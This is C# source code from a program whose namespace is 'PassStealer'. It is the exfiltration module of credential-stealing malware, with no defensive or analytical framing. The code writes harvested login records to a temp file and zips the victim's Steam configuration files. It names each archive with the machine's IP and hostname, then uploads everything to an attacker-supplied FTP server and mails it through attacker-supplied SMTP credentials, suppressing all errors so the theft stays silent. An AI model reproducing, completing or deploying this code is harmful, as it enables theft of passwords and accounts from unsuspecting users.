using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Threading;
using Ionic.Zip;

namespace PassStealer
{
	public class SendFiles
	{
		

		private string[] LoginData = new string[6];
        private string time;
        private string Zippath;
        private string ftpdir;
		public SendFiles(string smtp, string login, string pass, string ftphost, string ftplogin, string ftppass)
		{
            time = DateTime.Now.ToString("_HH.mm");
             Zippath = string.Concat(new string[]
                         {
                         Environment.GetEnvironmentVariable("TEMP"),
                         "\\",
                         SendFiles.getIP(),
                          time,
                         ".zip"
                          });
           
            this.LoginData[0] = "smtp." + smtp;
			this.LoginData[1] = login;
			this.LoginData[2] = pass;
			this.LoginData[3] = ftphost;
			this.LoginData[4] = ftplogin;
			this.LoginData[5] = ftppass;
            ftpdir = string.Concat(new string[]
               {
                    "ftp://",
                    this.LoginData[3],
                    "/",
                    SendFiles.getIP(),
                    time,
                    "/"
               });
            makedir();

        }

		private static string getIP()
		{
			string hostName = Dns.GetHostName();
			IPAddress iPAddress = Dns.GetHostByName(hostName).AddressList[0];
			string str = iPAddress.ToString();
			if (str != "")
			{
				return str + "_" + hostName;
			}
			return hostName;
		}

		public void compress(List<string> files, string path)
		{
            using (var zipfiles = new ZipFile())
            {
                zipfiles.AddFiles(files);
                zipfiles.Save(path);
            }

		}

		public void compress(string FileToCompress, string path)
		{
            using (var zipfile = new ZipFile())
            {
                zipfile.AddFile(FileToCompress);
                zipfile.Save(path);
            }
		}

		public void Sendftp(string attachFile)
		{
			try
			{
				FileInfo fileInfo = new FileInfo(attachFile);

				FtpWebRequest request = (FtpWebRequest)WebRequest.Create(new Uri(ftpdir + fileInfo.Name));
                request.Credentials = new NetworkCredential(this.LoginData[4], this.LoginData[5]);
                request.KeepAlive = false;
                request.Method = "STOR";
                request.UseBinary = true;
                request.ContentLength = fileInfo.Length;
				int num = 2048;
				byte[] buffer = new byte[num];
                using (FileStream fileStream = fileInfo.OpenRead())
                using (Stream requestStream = request.GetRequestStream())
                {
                    for (int count = fileStream.Read(buffer, 0, num); count != 0; count = fileStream.Read(buffer, 0, num))
                    {
                        requestStream.Write(buffer, 0, count);
                    }

                }
			}
			catch (Exception)
			{
			}
		}
        private bool makedir()
        {
            try
            {
                FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(new Uri(ftpdir));
                ftpWebRequest.Credentials = new NetworkCredential(this.LoginData[4], this.LoginData[5]);
                ftpWebRequest.KeepAlive = false;
                ftpWebRequest.Method = "MKD";
                FtpWebResponse ftpWebResponse = (FtpWebResponse)ftpWebRequest.GetResponse();
                ftpWebResponse.Close();
                return true;
            }
            catch
            {
                return false;
            }
        }
		public void SendMail(string attachFile)
		{
			try
			{
				MailMessage mailMessage = new MailMessage();
				mailMessage.From = new MailAddress(this.LoginData[1]);
				mailMessage.To.Add(new MailAddress(this.LoginData[1]));
				if (!string.IsNullOrEmpty(attachFile))
				{
					mailMessage.Attachments.Add(new Attachment(attachFile));
				}
				new SmtpClient
				{
					Host = this.LoginData[0],
					Port = 587,
					EnableSsl = true,
					Credentials = new NetworkCredential(this.LoginData[1], this.LoginData[2]),
					DeliveryMethod = SmtpDeliveryMethod.Network
				}.Send(mailMessage);
				mailMessage.Dispose();
			}
			catch (Exception)
			{
			}
		}

		public void sendPass(List<string[]> data)
		{
			try
			{
				if (data != null)
				{
					string text = Environment.GetEnvironmentVariable("TEMP") + "\\log.txt";
					StreamWriter streamWriter = new StreamWriter(text);
					for (int i = 0; i < data.Count; i++)
					{
						streamWriter.WriteLine(data[i][0]);
						streamWriter.WriteLine(data[i][1]);
						streamWriter.WriteLine(data[i][2]);
						streamWriter.WriteLine(data[i][3]);
						streamWriter.WriteLine("===========================================");
					}
					streamWriter.Close();
					this.Sendftp(text);
					this.SendMail(this.Zippath);
				}
			}
			catch
			{
			}
		}

		public void sendErrorLog(string data)
		{
			if (data != null)
			{
				string text = Environment.GetEnvironmentVariable("TEMP") + "\\error.txt";
                var stream = File.Open(text, FileMode.Create);
                var streamWriter = new StreamWriter(stream);
                streamWriter.WriteLine(data);
				streamWriter.Close();
                stream.Close();      
				this.Sendftp(text);
				this.SendMail(text);
          
			}
		}

		public void sendSteamFiles()
		{
			string configPath;
			List<string> steamPath = Path.getSteamPath(out configPath);
			if (steamPath != null)
			{
				this.compress(steamPath, this.Zippath);
				this.Sendftp(this.Zippath);
				this.SendMail(this.Zippath);
			}
		}



	}
}
